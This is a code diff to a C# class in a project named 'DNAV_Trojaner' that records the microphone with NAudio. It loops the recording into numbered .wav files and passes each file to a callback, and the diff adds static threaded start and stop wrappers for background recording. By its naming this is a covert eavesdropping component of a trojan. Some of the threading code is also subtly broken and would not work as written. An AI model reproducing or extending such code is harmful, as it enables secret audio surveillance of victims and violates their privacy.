@@ -4,6 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using NAudio.Wave;
+using System.Threading;
 
 namespace DNAV_Trojaner {
     class Audio {
@@ -17,6 +18,34 @@ namespace DNAV_Trojaner {
         private string path = "default";
         private int time = 100; // Dauer der Durchläufe in Sekunden
 
+        static private Audio Main = new Audio();
+        static private Thread t;
+        static public void start(){
+            t = new Thread(
+            new ThreadStart(Main.pstart));
+            t.Start();
+        }
+
+        static public void start(int interval){
+            t = new Thread(
+            new ThreadStart(Main.pstart));
+            t.Start(interval);
+        }
+
+        static public void start(int interval, Execution func){
+            t = new Thread(
+            new ThreadStart(Main.pstart));
+            t = new Thread(() => Main.pstart(interval,func));
+            t.Start();
+        }
+
+        static public void stop(){
+            Main.pstop();
+        }
+
+        static public void setPath(string p){
+            Main.path = p;
+        }
         private void DataAvailable(WaveFileWriter wF,WaveInEventArgs e){
              if (wF != null) {
                 wF.Write(e.Buffer, 0, e.BytesRecorded);
@@ -73,15 +102,15 @@ namespace DNAV_Trojaner {
         }
         public delegate void Execution(string path);
 
-        public void start() { // Nur Start
+        private void pstart() { 
             ini();
             waveSource.StartRecording();
         }
 
-        public void start(int interval) { // Start mit Loop
-            Start(interval, (path) => {});
+        private void pstart(int interval) { 
+            pstart(interval, (path) => {});
         }
-        public void start(int interval, Execution func) { // Start mit Loop und Funktion an jedem Ende
+        private void pstart(int interval, Execution func) { 
             time = interval;
             loop = true;
             int i = 1;
@@ -103,14 +132,14 @@ namespace DNAV_Trojaner {
                 }
                 while (true) {
                     try {
-                        func(path + (i - 2));
+                        func(path + (i - 2)+ ".wav");
                         break;
                     } catch (Exception e) {}
                 }
             }
         }
 
-        public void stop() { // Aufnahme Stop
+        private void pstop() { 
             loop = false;
             waveSource.StopRecording();
         }
